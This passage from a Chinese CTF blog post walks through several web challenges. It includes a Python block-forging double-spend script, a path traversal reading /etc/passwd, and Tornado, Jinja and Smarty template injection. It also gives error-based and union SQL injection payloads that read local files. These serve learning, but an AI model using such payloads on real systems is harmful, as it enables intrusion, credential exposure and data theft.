+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_hash</span><span class="params">(prev,tx)</span>:</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">     current_block=create_block(prev,str(i),tx)</span><br><span class="line">     block_hash = int(current_block[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">     <span class="keyword">if</span> block_hash&lt;DIFFICULTY:</span><br><span class="line">       <span class="keyword">print</span> json.dumps(current_block)</span><br><span class="line">       <span class="keyword">return</span> current_block</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_feak_one</span><span class="params">()</span>:</span></span><br><span class="line">   utxo_first=create_output_utxo(shop_addr,<span class="number">1000000</span>)</span><br><span class="line">   tx_first=create_tx([bank_utox_id],[utxo_first])</span><br><span class="line">   <span class="keyword">return</span> check_hash(prev_one,[tx_first])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_empty_block</span><span class="params">(prev)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> check_hash(prev,[])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>check_hash：计算出符合难度系数的hash值的区块</li>
+<li>create_feak_one：生成一个转账给商店的假块</li>
+<li>create_empty_block：生成空块</li>
+</ul>
+<p>生成攻击块：</p>
+<p>a=create_feak_one()<br> b=create_empty_block(a[‘hash’])<br> c=create_empty_block(b[‘hash’])<br> d=create_empty_block(c[‘hash’])<br> e=create_empty_block(d[‘hash’])</p>
+<p>整合脚本，这里我更改了create_tx方法中的签名的计算方法，直接把黑客块的签名写死到了该方法中，因为毕竟只需要伪造一个有转账记录的空块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">\# -- encoding: utf-8 --</span><br><span class="line">\# written in python 2.7</span><br><span class="line">import hashlib, json, rsa, uuid, os,requests,re</span><br><span class="line">\# 一堆变量常量</span><br><span class="line">url_root=&quot;http://111.198.29.45:36777/&quot;</span><br><span class="line">url_create=&quot;http://111.198.29.45:36777/create_transaction&quot;</span><br><span class="line">url_flag=&quot;http://111.198.29.45:36777/flag&quot;</span><br><span class="line">s=requests.Session()</span><br><span class="line">ddcoin = s.get(url=url_root)</span><br><span class="line">prev_one=re.search(*r*&quot;hash of genesis block: ([0-9a-f]&#123;64&#125;)&quot;,ddcoin.content, flags=0).group(1)</span><br><span class="line">bank_utox_id=re.search(*r*&quot;\&quot;input\&quot;: \[\&quot;([0-9a-f\-]&#123;36&#125;)&quot;,ddcoin.content, flags=0).group(1)</span><br><span class="line">bank_signature=re.search(*r*&quot;\&quot;signature\&quot;: \[\&quot;([0-9a-f]&#123;96&#125;)&quot;,ddcoin.content, flags=0).group(1)</span><br><span class="line">DIFFICULTY = int(&apos;00000&apos; + &apos;f&apos; * 59, 16)</span><br><span class="line">EMPTY_HASH = &apos;0&apos;*64</span><br><span class="line">bank_addr=&quot;99615b8ddbb63d4dd83ddc8d808cb96346ac6bcdbaff771b7906b275e3289732d24eeb6eae93119e0b6567dc4566deeb&quot;</span><br><span class="line">hacke_addr=&quot;d3066b9b57e3c988acf8cc74071d5a6fdf9fefcb8a39c86c95f5b3e3ec4c78e5033756c421b58ead45e2cee33340f88b&quot;</span><br><span class="line">shop_addr=&quot;8dd8bb2aaa3179f94903d75d8d5a05ad2643f748cf54957939eadae2aec0164b730d20ca64b4cf20136781568b850177&quot;</span><br></pre></td></tr></table></figure>
+<p># 源码中的API</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">def hash(x):</span><br><span class="line">  return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()  </span><br><span class="line"></span><br><span class="line">def hash_reducer(x, y):</span><br><span class="line">  return hash(hash(x)+hash(y))</span><br><span class="line"></span><br><span class="line">def hash_block(block):</span><br><span class="line">  return reduce(hash_reducer, [block[&apos;prev&apos;], block[&apos;nonce&apos;], reduce(hash_reducer, [tx[&apos;hash&apos;] for tx in block[&apos;transactions&apos;]], EMPTY_HASH)])</span><br><span class="line"></span><br><span class="line">def hash_utxo(*utxo*):</span><br><span class="line">  return reduce(hash_reducer, [utxo[&apos;id&apos;], utxo[&apos;addr&apos;], *str*(utxo[&apos;amount&apos;])])</span><br><span class="line"></span><br><span class="line">def hash_tx(*tx*):</span><br><span class="line">  return reduce(hash_reducer, [</span><br><span class="line">    reduce(hash_reducer, tx[&apos;input&apos;], EMPTY_HASH),</span><br><span class="line">    reduce(hash_reducer, [utxo[&apos;hash&apos;] for utxo in tx[&apos;output&apos;]], EMPTY_HASH)</span><br><span class="line">  ])</span><br><span class="line"></span><br><span class="line">def create_output_utxo(*addr_to*, *amount*):</span><br><span class="line">  utxo = &#123;&apos;id&apos;: *str*(uuid.uuid4()), &apos;addr&apos;: addr_to, &apos;amount&apos;: amount&#125;</span><br><span class="line">  utxo[&apos;hash&apos;] = hash_utxo(utxo)</span><br><span class="line">  return utxo </span><br><span class="line"></span><br><span class="line">def create_tx(*input_utxo_ids*, *output_utxo*, *privkey_from*=None):</span><br><span class="line">  tx = &#123;&apos;input&apos;: input_utxo_ids, &apos;signature&apos;:[bank_signature], &apos;output&apos;: output_utxo&#125; # 修改了签名</span><br><span class="line">  tx[&apos;hash&apos;] = hash_tx(tx)</span><br><span class="line"></span><br><span class="line">  return tx</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">def create_block(prev_block_hash, nonce_str, transactions):</span><br><span class="line">  if type(prev_block_hash) != type(&apos;&apos;): raise Exception(&apos;prev_block_hash should be hex-encoded hash value&apos;)</span><br><span class="line">  nonce = str(nonce_str)</span><br><span class="line">  if len(nonce) &gt; 128: raise Exception(&apos;the nonce is too long&apos;)</span><br><span class="line">  block = &#123;&apos;prev&apos;: prev_block_hash, &apos;nonce&apos;: nonce, &apos;transactions&apos;: transactions&#125;</span><br><span class="line">  block[&apos;hash&apos;] = hash_block(block)</span><br><span class="line">  return block</span><br><span class="line"></span><br><span class="line">\# 构造的方法</span><br><span class="line">def check_hash(prev,tx):</span><br><span class="line">  for i in range(10000000):</span><br><span class="line">    current_block=create_block(prev,str(i),tx)</span><br><span class="line">    block_hash = *int*(current_block[&apos;hash&apos;], 16)</span><br><span class="line">    if block_hash&lt;DIFFICULTY:</span><br><span class="line">      print json.dumps(current_block)</span><br><span class="line">      return current_block</span><br><span class="line">      </span><br><span class="line">def create_feak_one():</span><br><span class="line"></span><br><span class="line">  utxo_first=create_output_utxo(shop_addr,1000000)</span><br><span class="line"></span><br><span class="line">  tx_first=create_tx([bank_utox_id],[utxo_first])</span><br><span class="line"></span><br><span class="line">  return check_hash(prev_one,[tx_first])</span><br><span class="line"></span><br><span class="line">def create_empty_block(prev):</span><br><span class="line"></span><br><span class="line">  return check_hash(prev,[])</span><br><span class="line"></span><br><span class="line">\# 攻击过程</span><br><span class="line">a=create_feak_one()</span><br><span class="line">print s.post(url=url_create,*data*=*str*(json.dumps(a))).content</span><br><span class="line">b=create_empty_block(a[&apos;hash&apos;])</span><br><span class="line">print s.post(*url*=url_create,*data*=*str*(json.dumps(b))).content</span><br><span class="line">c=create_empty_block(b[&apos;hash&apos;])</span><br><span class="line">print s.post(url=url_create,*data*=*str*(json.dumps(c))).content</span><br><span class="line">d=create_empty_block(c[&apos;hash&apos;])</span><br><span class="line">print s.post(url=url_create,*data*=*str*(json.dumps(d))).content</span><br><span class="line">e=create_empty_block(d[&apos;hash&apos;])</span><br><span class="line">print s.post*url=url_create,*data*=*str*(json.dumps(e))).content</span><br><span class="line">print s.get(url=url_flag).content</span><br></pre></td></tr></table></figure>
+<p>运行脚本</p>
+<p><img src="/2020/01/11/攻防世界web/4.png" alt="4"></p>
+<h2 id="0x02-Warmwp"><a href="#0x02-Warmwp" class="headerlink" title="0x02 Warmwp"></a>0x02 Warmwp</h2><p><img src="/2020/01/11/攻防世界web/5.png" alt="5"></p>
+<p>访问得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">      <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">       $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $_page = urldecode($page);</span><br><span class="line">      $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">  &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看一下代码，get提交了一个file参数，并设置了白名单，要求?以前的字符串要在白名单之中，那就直接构造就好了</p>
+<p><code>http://111.198.29.45:52387/source.php?file=source.php?../../../../../etc/passwd</code></p>
+<p>测试一下，访问成功</p>
+<p><img src="/2020/01/11/攻防世界web/6.png" alt="6"></p>
+<p>接下来直接访问hint.php提示得flag就好了</p>
+<p><img src="/2020/01/11/攻防世界web/7.png" alt="7"></p>
+<p>猜测应该就在根目录下，直接访问</p>
+<p><code>http://111.198.29.45:52387/source.php?file=source.php?../../../../../ffffllllaaaagggg</code></p>
+<p><img src="/2020/01/11/攻防世界web/8.png" alt="8"></p>
+<h2 id="0x03-Easytornado"><a href="#0x03-Easytornado" class="headerlink" title="0x03 Easytornado"></a>0x03 Easytornado</h2><p><img src="/2020/01/11/攻防世界web/9.png" alt="9"></p>
+<p><img src="/2020/01/11/攻防世界web/10.png" alt="10"></p>
+<p><img src="/2020/01/11/攻防世界web/11.png" alt="11"></p>
+<p>给了flag文件的位置，和filehash生成方式，抓包没有发现<code>cookie_secret</code></p>
+<p>所以这s道题主要目的就是找到<code>cookie_sercet</code></p>
+<p>因为tornade是一个python得框架，随便修改一个页面</p>
+<p>得filehash，进入了一个error页面，猜测可能可以模板注入</p>
+<p><img src="/2020/01/11/攻防世界web/12.png" alt="12"></p>
+<p>但是测试发现，这里基本上过过滤了所有可用字符emmmm</p>
+<p>然后没有思路了，看了大佬的wp，在welcome.txt文件中其实有一个提示render，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页并访问。这道题目在操作时，其实参数也是传递这样传递过来的，在tornade模板中，也存在一些可以访问的快速对象，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; escape(handler.settings[&quot;cookie&quot;]) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>和这个字典对象，可知道，这个<code>handler.settings</code>对象就是我们完成这个题目进行模板注入时所需要的，cookie_secret就存放在<code>handler.settings</code>中</p>
+<p>于是，得到cookie_secret</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:33874/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/11/攻防世界web/13.png" alt="13"></p>
+<p>大佬的链接：<a href="https://blog.csdn.net/iamsongyu/article/details/83346029" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/83346029</a></p>
+<p>接下来构造一下就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=ecfb88a49b25851d92726d2fa8d78b7a</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/01/11/攻防世界web/14.png" alt="14"></p>
+<h2 id="0x04-Shrine"><a href="#0x04-Shrine" class="headerlink" title="0x04 Shrine"></a>0x04 Shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>) </span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">  <span class="keyword">return</span> open(__file__).read() </span><br><span class="line"><span class="meta">@app.route('/shrine/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span> </span><br><span class="line">    s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>) </span><br><span class="line">    blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>] </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">  <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">      app.run(*debug*=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
+<p>打开就有源码，格式化一下，然后审计</p>
+<p><img src="/2020/01/11/攻防世界web/15.png" alt="15"></p>
+<p>在shrine路由里，可能存在模板注入，试一试</p>
+<p><img src="/2020/01/11/攻防世界web/16.png" alt="16"></p>
+<p>确实存在，但是后面的测试中发现过滤了一些字符，重要的’(‘ 和 ‘)’也被过滤了，想办法绕过吧</p>
+<p>查了很多资料~~~就剩 get_flashed_messages(), url_for() 可以用了，接下来就利用这个构造payload</p>
+<p><code></code></p>
+<p><img src="/2020/01/11/攻防世界web/17.png" alt="17"></p>
+<h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><p>进入页面，注册登陆，发现在view页面可能存在注入，测试了一下，确实是</p>
+<p><img src="/2020/01/11/攻防世界web/18.png" alt="18"></p>
+<p>这里利用报错注入</p>
+<p>爆表名<br><code>/view.php?no=1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#</code></p>
+<p><img src="/2020/01/11/攻防世界web/19.png" alt="19"></p>
+<p>爆列名<br><code>/view.php?no=1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1)#</code></p>
+<p><img src="/2020/01/11/攻防世界web/20.png" alt="20"></p>
+<p>爆字段<br><code>/view.php?no=1 and updatexml(1,make_set(3,&#39;~&#39;,(select no from users)),1)#</code></p>
+<p><img src="file:///C:/Users/我叫黄~1/AppData/Local/Temp/msohtmlclip1/01/clip_image021.png" alt="query error! (XPATH syntax error: •w,l&#39;) "></p>
+<p><code>/view.php?no=1 and updatexml(1,make_set(3,&#39;~&#39;,(select username from users)),1)#</code></p>
+<p><img src="/2020/01/11/攻防世界web/22.png" alt="22"></p>
+<p><code>/view.php?no=1 and updatexml(1,make_set(3,&#39;~&#39;,(select passwd from users)),1)#</code></p>
+<p><img src="/2020/01/11/攻防世界web/23.png" alt="23"></p>
+<p><code>/view.php?no=1 and updatexml(1,make_set(3,&#39;~&#39;,(select username from users)),1)#</code></p>
+<p><img src="/2020/01/11/攻防世界web/24.png" alt="24"></p>
+<p>在data这个字段里面发现存储的是，一个反序列化的内容，内容就是view.php所展示出来的username，age和blog，所以我们这里可以利用union注入一条新的信息，先看看当前页面view.php里面有啥</p>
+<p><code>view.php?no=31 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:6:&quot;xianyu&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/view.php&quot;;}&#39;#</code></p>
+<p><img src="/2020/01/11/攻防世界web/25.png" alt="25"></p>
+<p>看了些这几个文件都没有发现有flag的踪迹，于是谁便访问了一下flag.php，发现是存在这个文件的</p>
+<p><img src="/2020/01/11/攻防世界web/26.png" alt="26"></p>
+<p>然后依靠注入读到这个文件，得到flag</p>
+<p><code>view.php?no=31 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:6:&quot;xianyu&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;#</code></p>
+<p>在页面中就会包含flag文件</p>
+<p><img src="/2020/01/11/攻防世界web/27.png" alt="27"></p>
+<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>根据题目和给的提示模板注入，谷歌走一波，smarty是php的一个模板引擎，根据提示，在这个题目中应该是存在模板注入的，这个题目的主要页面时一个获取IP的api</p>
+<p><img src="/2020/01/11/攻防世界web/28.png" alt="28"></p>
+<p>通过页面的提示也很容易得出，这里获取IP时通过xff请求头获取的，所以尝试构造xff请求头，模板注入，查资料可得，php smarty模板注入可以使用{$smarty.version}这条用来查询smaty版本的语句验证，所以这里写入xff中，验证成功</p>
+<p><img src="/2020/01/11/攻防世界web/29.png" alt="29"></p>
+<p>在Smarty3的官方文档可以得知</p>
+<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, or, &amp;&amp;, and, is_array(), 等等</p>
+<p>所以我们可以利用这个特性使用{if}{/if}来构造payload，先构造{if phpinfo()}{/if}进行验证，验证成功</p>
+<p><img src="/2020/01/11/攻防世界web/30.png" alt="30"></p>
+<p>大佬的wp说这里很容易就可以利用这个来构造payload得到flag，但是我尝试了很久，命令执行都没有回显，于是又到处去找了一下其他的wp，发现在buuctf上面也有这道题，而且这道题直接就可以命令执行，得到flag，后面猜测buu上面的题目可能没有完整复现，省略了一些方法的过滤，所以buu执行成功了，攻防世界题目要求更高就无法成功，所以   咕咕咕</p>
+<p><img src="/2020/01/11/攻防世界web/123.jpg" alt="123"></p>
+<font color="#ffffff"> PS:明天就要回家，怎么说呢？心情有些烦躁，在学校呆了10天左右，感觉自己啥也没做，越来越怠惰了，我需要整理一下自己的情绪了</font>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTFWEB/" rel="tag"># CTFWEB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/01/04/Token窃取与利用/" rel="prev" title="Token窃取与利用">
+      <i class="fa fa-chevron-left"></i> Token窃取与利用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Web-python-block-chain"><span class="nav-number">1.</span> <span class="nav-text">0x01 Web_python_block_chain</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#双花攻击"><span class="nav-number">1.0.1.</span> <span class="nav-text">双花攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#区块链基础知识"><span class="nav-number">1.0.2.</span> <span class="nav-text">区块链基础知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目分析"><span class="nav-number">1.0.3.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击思路"><span class="nav-number">1.0.4.</span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击脚本"><span class="nav-number">1.0.5.</span> <span class="nav-text">攻击脚本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Warmwp"><span class="nav-number">2.</span> <span class="nav-text">0x02 Warmwp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Easytornado"><span class="nav-number">3.</span> <span class="nav-text">0x03 Easytornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Shrine"><span class="nav-number">4.</span> <span class="nav-text">0x04 Shrine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fakebook"><span class="nav-number">5.</span> <span class="nav-text">Fakebook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Smarty"><span class="nav-number">6.</span> <span class="nav-text">Smarty</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="瑟瑟发抖咸鱼黄"
+      src="/images/HeadPortrait.png">
+  <p class="site-author-name" itemprop="name">瑟瑟发抖咸鱼黄</p>
+  <div class="site-description" itemprop="description">您看！工具人啥都不配拥有!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://gorgias.me/" title="https://gorgias.me/" rel="noopener" target="_blank">巨佬</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://couplee.wang/" title="http://couplee.wang/" rel="noopener" target="_blank">wnagzihxa1n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.tity.xyz/" title="https://blog.tity.xyz/" rel="noopener" target="_blank">WarrenRyan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://pukrr.github.io/" title="https://pukrr.github.io/" rel="noopener" target="_blank">pukrr</a>
